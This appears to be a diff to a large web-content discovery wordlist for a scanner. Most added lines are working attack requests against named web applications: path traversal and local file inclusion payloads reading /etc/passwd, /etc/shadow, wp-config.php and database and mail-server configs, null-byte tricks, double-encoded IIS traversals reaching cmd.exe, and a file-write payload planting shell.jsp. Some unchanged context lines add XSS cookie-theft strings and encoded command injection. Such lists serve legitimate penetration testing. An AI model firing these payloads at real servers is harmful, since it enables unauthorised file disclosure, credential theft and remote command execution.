 phpMyAdmins/
 phpMyAdmintop100
+phpMyAgenda/templates/header.php3?language=../../../logs/access.log 
 phpMyBackupPro
 phpMyBackupPro/config.php
 phpMyBackupPro/get_file.php
@@ -165204,6 +165128,7 @@ phplist/
 phplist/admin/
 phplist/index.php
 phplist/lists/index.php
+phplist/lists/index.php?GLOBALS[developer_email]=1&GLOBALS[database_module]=../../../../../../etc/passwd
 phplistbridge
 phplistbridge1
 phplistdev
@@ -166255,6 +166180,7 @@ piwigo-2.0.6/comments.php
 piwigo/admin.php
 piwigo/install.php
 piwigo/install.php?dl=../../../../../../lio_passwords.txt
+piwigo/install.php?dl=/../../local/config/database.inc.php
 piwigo/picture.php
 piwigo/ws.php
 piwik
@@ -166344,6 +166270,7 @@ pkg_mgr_install.php
 pkg_mgr_settings.php
 pkgconvert
 pkgelementindex.tpl
+pkgelementindex.tpl.php
 pkginfo
 pkginfo/
 pkgs
@@ -166352,6 +166279,7 @@ pki
 pkinc
 pkm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
 pkmslogout
+pkmslogout?filename=../../../../../../../etc/passwd
 pkok.asp
 pks
 pks/lookup
@@ -168168,6 +168096,7 @@ popup.html
 popup.js
 popup.jsp
 popup.php
+popup.php?read=../../../../../../../../../etc/passwd
 popup.tpl
 popup/
 popup/koment.php
@@ -169234,6 +169163,7 @@ ppolicy.html
 ppolicy.php
 ppp
 pppage.php
+pppblog/ ../../../../../../etc/passwd
 pppblog/static.php
 pppoe.cgi
 ppproductcc.aspx
@@ -171692,6 +171622,7 @@ profile.module
 profile.pages.inc
 profile.php
 profile.php4
+profile.php?cmd=&action=view&uname=../../../../../../../../../var/log/httpd/error_log%00
 profile.php?u=JUNK(8)
 profile.php?uname=demo
 profile.phtml
@@ -171760,6 +171691,8 @@ profile_results.html
 profile_search.html
 profile_search.php
 profile_send.php
+profile_send.php?pun_user[language]=../../../../../etc/passwd
+profile_send.php?pun_user[language]=../../../../etc/passwd%00
 profile_send_email.tpl
 profile_send_email.txt
 profile_send_im.txt
@@ -173251,6 +173184,7 @@ provost
 prowebwalker
 prowers
 proxies
+proxima/modules/Forums/bb_smilies.php?name=../../../../../../etc/passwd%00
 proximamente.php
 proxy
 proxy.%EXT%
@@ -174736,6 +174670,9 @@ quiklnch.aspx
 quikmail/nph-emumail.cgi?type=../%00
 quikstore.cfg
 quikstore.cgi
+quikstore.cgi?category=blah&template=../../../../../../../../../../../../etc/hosts
+quikstore.cgi?category=blah&template=../../../../../../../../../../../../usr/bin/id
+quikstore.cgi?category=blah&template=../../../../../../../../../../etc/passwd%00.html
 quilts
 quin.php
 quinn.htm
@@ -181234,6 +181171,10 @@ samples.html
 samples.php
 samples.sql
 samples/
+samples/..%252f..%252f..%252f..%252fwinnt/system32/cmd.exe?/c+
+samples/..%255c..%255c..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+
+samples/..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+
+samples/..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+
 samples/activitysessions
 samples/messagebroker/http
 samples/messagebroker/httpsecure
@@ -183132,6 +183073,7 @@ scprocessIPN.asp
 scprocessipn.asp
 scr
 scr.cgi
+scr.cgi?fname=../../../../../etc/passwd%00&status=
 scr/
 scr/soustab.php
 scrabble
@@ -183454,7 +183396,10 @@ scripts.php
 scripts.txt
 scripts/
 scripts/*%0a.pl
+scripts/..%252f..%252f..%252f..%252fwinnt/system32/cmd.exe?/c+
+scripts/..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+
 scripts/..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir
+scripts/..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+
 scripts/..%255c..%255cwinnt/system32/cmd.exe?/c+dir
 scripts/..%255c..%255cwinnt/system32/cmd.exe?/c+ver
 scripts/..%c0%af..%c0%afwinnt/system32/cmd.exe?/c+dir+c:\\
@@ -183482,6 +183427,7 @@ scripts/c32web.exe/GetImage
 scripts/cart32.exe/GetLatestBuilds
 scripts/cart32.exe/cart32clientlist 
 scripts/cbag/ag.exe
+scripts/cbag/ag.exe?page=FileDownload&id=../../../../../../../../../../../../../inetpub/scripts/cbag/cb5/data/admin&notimecard=1&type=text&subtype=html&ct=1
 scripts/cbgrn/grn.exe/memo/print
 scripts/cbgrn/grn.exe/memo/view
 scripts/cbgrn/grn.exe/phonemessage/add
@@ -183586,6 +183532,8 @@ scripts/rpc.php
 scripts/rss.scr.php
 scripts/run-tests.sh
 scripts/s360v2/s360.exe
+scripts/s360v2/s360.exe?page=FileDownload&id=../../../../../../../../../../inetpub/scripts/s360v2/s360v2/data/admin&type=text&subtype=plain&ct=1&.
+scripts/s360v2/s360.exe?page=MessageDownload&mid=37&id=../../../../../../../../../../inetpub/scripts/s360v2/s360v2/data/admin&bc=1&type=text&subtype=plain&ct=1&.
 scripts/samples/
 scripts/samples/ctguestb.idc
 scripts/samples/details.idc
@@ -185775,6 +185723,7 @@ seriesissues.aspx
 sermon
 sermons
 sermons.tpl
+sermons.tpl.php
 seron
 seronarea
 serp.php
@@ -185824,6 +185773,7 @@ server.inc.php
 server.key
 server.log
 server.np
+server.np?base&site=XXXintra&catalog=catalog&template=../../../../../../../../../boot.ini
 server.pem
 server.php
 server.php.svn-base
@@ -186152,6 +186102,7 @@ servlet/custMsg?guestName=<script>alert(\"Vulnerable\")</script>
 servlet/custMsg?guestName=<script>alert(document.cookie)(\
 servlet/default/
 servlet/downloadReport
+servlet/downloadReport?reportFileName=../../../../../../../../etc/passwd&format=CSV
 servlet/f60servlet
 servlet/file/login.jsp
 servlet/gwmonitor
@@ -186209,6 +186160,7 @@ servlets-examples/servlet/CookieExample
 servlets/
 servlets/BrowseList
 servlets/FetchFile
+servlets/FetchFile?fileName=../../../etc/shadow
 servlets/FileUploadServlet
 servlets/FileUploadServlet?fileName=../jsp/Login.jsp
 servlets/GetChallengeServlet
@@ -186513,6 +186465,7 @@ settings.server.php
 settings.sql
 settings.swp
 settings.tpl
+settings.tpl.php
 settings.tt
 settings.txt
 settings.xml
@@ -186582,6 +186535,7 @@ setup.mvc
 setup.nsf
 setup.php
 setup.php.svn-base
+setup.php?localeset=../../../../../../../../../../etc/passwd%00
 setup.py
 setup.sql
 setup.tpl
@@ -194597,6 +194551,7 @@ status2.php
 status?full=true
 statusAdmin.php
 statusUpdate
+statusUpdate?actionToCall=LFU&customerId=1337&fileName=../../../../../../shell.jsp&configDataID=1
 status_captiveportal.php
 status_captiveportal_expire.php
 status_graph.php
@@ -199661,6 +199616,7 @@ test.cgi
 test.chm
 test.class.php
 test.conf
+test.conf%7Csetup.php
 test.config.php
 test.csv
 test.db
@@ -199720,6 +199676,7 @@ test.sqlite
 test.swf
 test.tmpl.php
 test.tpl
+test.tpl.php
 test.txt
 test.vm
 test.woa
@@ -200898,6 +200855,7 @@ theme.txt
 theme.xml
 theme/
 theme/Cardinal/template.php
+theme/acgv.php?rubrik=../../../etc/passwd%00
 theme/default.php
 theme/default_xhtml.php
 theme/format.php
@@ -201678,6 +201636,7 @@ tikilib.php
 tikimovies
 tikiwiki
 tikiwiki/
+tikiwiki/ cat ./../../db/local.php -p81
 tikiwiki/tiki-imexport_languages.php
 tikiwiki/tiki-index.php
 tiku
@@ -205554,6 +205513,7 @@ unavailable.html
 unavailable.php
 unavailableSuccess.php
 unb_lib/abbc.css.php
+unb_lib/abbc.css.php?ABBC[Config][smileset]=../../../../../../../../../etc/passwd%00
 unban.aspx
 unbinary()
 unblock
@@ -207169,6 +207129,7 @@ user/help/help.shtml
 user/home.php
 user/index.php
 user/index.php                             
+user/index.php../../../../../../../../../../etc/passwd%00
 user/index_inline_editor_submit.php
 user/info.php
 user/internettoolbar/index.php
@@ -207962,6 +207923,7 @@ users.tar.gzip
 users.tgz
 users.thtml
 users.tpl
+users.tpl.php
 users.txt
 users.xls
 users.xml
@@ -209374,6 +209336,7 @@ value.right.php
 value.text-indent.class.php
 value.top.php
 value="../../../../../../../../../../../var/log/ona.log" />
+value="../../../../../../../../../../etc/passwd">
 valueclick
 values
 values.html
@@ -209423,6 +209386,7 @@ var.inc
 var.inc.php
 var.php
 var.tpl
+var.tpl.php
 var/
 var/SoCKGdoKFmeobxZTEWDz/downloads/singlelogfile/confd-debug.log
 var/adm
@@ -211700,6 +211664,8 @@ viewtopic.php.bak
 viewtopic.php?t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527
 viewtopic.php?t=2&rush=%6c%73%20%2d%61%6c&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527
 viewtopic2.php
+viewtopic_PM-link.php?pun_user[language]=../../../../../etc/passwd
+viewtopic_PM-link.php?pun_user[language]=../../../../etc/passwd%00
 viewtopic_attach_body.tpl
 viewtopic_body.html
 viewtopic_body.tpl
@@ -212707,6 +212673,7 @@ vtiger/index.php
 vtigercrm
 vtigercrm/
 vtigercrm/graph.php
+vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action
 vtigercrm/include/Ajax/CommonAjax.php
 vtigercrm/index.php
 vtigercrm/modules/com_vtiger_workflow/sortfieldsjson.php
@@ -213693,6 +213660,7 @@ webMathematica/MSP?MSPStoreID=../../../../../../../../../../etc/passwd&MSPStoreT
 webMathematica/MSP?MSPStoreID=..\..\..\..\..\..\..\..\..\..\boot.ini&MSPStoreType=image/gif
 webNewAcct.cgi
 webOrder
+webSPELL/picture.php?id=../../../../../etc/passwd
 webService
 webService/webServicesGeneral.jsf
 webServices
@@ -213808,6 +213776,10 @@ webadmin/filter.pl
 webadmin/index.asp
 webadmin/index.html
 webadmin/index.php
+webadmin/index.php?index.php?page=background/../../../../../../../../../Program+Files/hmailserver/Bin/hmailserver.ini%00
+webadmin/index.php?index.php?page=background/../../MySQL/my.ini%00
+webadmin/index.php?page=background/../../../../../../../../boot.ini%00
+webadmin/index.php?page=background/../../Bin/hMailServer.INI%00
 webadmin/login.asp
 webadmin/login.html
 webadmin/login.php
@@ -214260,6 +214232,7 @@ webid/eledicss.php
 webid/logs/cron.log
 webif.cgi
 webif/webif.cgi
+webif/webif.cgi?cmd=query&config=conf_2000/config.
 webilizer
 webim
 webim/
@@ -215129,6 +215102,7 @@ wgallery_brain.php
 wgallery_view
 wgallery_vote.php
 wgarcmin.cgi
+wgarcmin.cgi?NEXTPAGE=D&ID=1&DOC=../../../../etc/passwd
 wgate/scripts/ralp/
 wgbh
 wget
@@ -216132,6 +216106,7 @@ wordpress-test
 wordpress-themes
 wordpress.php
 wordpress/
+wordpress/ your_username password cat ./../../../wp-config.php 
 wordpress/index.php
 wordpress/index.php/2015/05/21/church_admin-registration-form/
 wordpress/pdb-signup/
@@ -216378,6 +216353,7 @@ wp-admin/admin-ajax.php?action=../../../../../index.php
 wp-admin/admin-ajax.php?action=/../../../../../../index
 wp-admin/admin-ajax.php?action=ap_file_upload_action
 wp-admin/admin-ajax.php?action=getfile&/../../wp-config.php
+wp-admin/admin-ajax.php?action=wpie_remove_export_entry
 wp-admin/admin-ajax.php`
 wp-admin/admin-footer.php
 wp-admin/admin-functions.php
@@ -217743,6 +217719,7 @@ wp-content/plugins/wp-useronline/widget.php
 wp-content/plugins/wp-useronline/wp-stats.php
 wp-content/plugins/wp-useronline/wp-useronline.php
 wp-content/plugins/wp-whois/wp-whois-ajax.php
+wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../..//etc/passwd
 wp-content/plugins/wpSS/ss_handler.php
 wp-content/plugins/wpSS/ss_load.php
 wp-content/plugins/wp_rokintroscroller/rokintroscroller.php
@@ -217768,6 +217745,7 @@ wp-content/plugins/wptouch/ajax.php
 wp-content/plugins/wysija-newsletters/readme.txt
 wp-content/plugins/x7host-videox7-ugc-plugin/x7listplayer.php
 wp-content/plugins/xcloner-backup-and-restore/cloner.cron.php
+wp-content/plugins/xcloner-backup-and-restore/cloner.cron.php?config=../../../../../../../../etc/passwd
 wp-content/plugins/xcloner-backup-and-restore/index2.php
 wp-content/plugins/xcloner-backup-and-restore/readme.txt
 wp-content/plugins/xcloner-backup-and-restore/restore/XCloner.php
@@ -220473,8 +220451,14 @@ xoops-2.5.7.2/htdocs/modules/system/admin.php
 xoops.inc.php
 xoops.php
 xoops/class/xoopseditor/dhtmltextarea/editor_registry.php
+xoops/class/xoopseditor/dhtmltextarea/editor_registry.php?xoopsConfig[language]=../../../../../../../../../../boot.ini%00
+xoops/class/xoopseditor/dhtmltextarea/editor_registry.php?xoopsConfig[language]=../../../../../../../../../../script
 xoops/class/xoopseditor/koivi/editor_registry.php
+xoops/class/xoopseditor/koivi/editor_registry.php?xoopsConfig[language]=../../../../../../../../../../boot.ini%00
+xoops/class/xoopseditor/koivi/editor_registry.php?xoopsConfig[language]=../../../../../../../../../../script
 xoops/class/xoopseditor/textarea/editor_registry.php
+xoops/class/xoopseditor/textarea/editor_registry.php?xoopsConfig[language]=../../../../../../../../../../boot.ini%00
+xoops/class/xoopseditor/textarea/editor_registry.php?xoopsConfig[language]=../../../../../../../../../../script
 xoops/html/index.php
 xoops/modules/profile/register.php
 xoops/modules/system/admin.php
@@ -221186,6 +221170,8 @@ yesgame.php
 yeste
 yesterday
 yesterday/
+yeswiki/wakka.php?wiki=HomePage/diaporama&template=/../../../../../../../../../../../../etc/passwd
+yeswiki/wakka.php?wiki=PagesACreer/edit&theme=yeswiki&squelette=/../../../../../../../../../../../../etc/passwd&style=gray.css&bgimg=&newpage=1
 yetanotherforum
 yf
 yfood
@@ -221987,6 +221973,7 @@ zimm
 zimmer-suiten
 zimmerman
 zimplit.php
+zimplit.php?action=load&file=../../../../../../../[ LFI ]%00' method='post'>
 zimplit/zimplit.php
 zimplit/zimplit.php?action=listAllFiles&file=../../../../
 zimplit/zimplit.php?action=load1&file=../../../../../../../../../etc/passwd
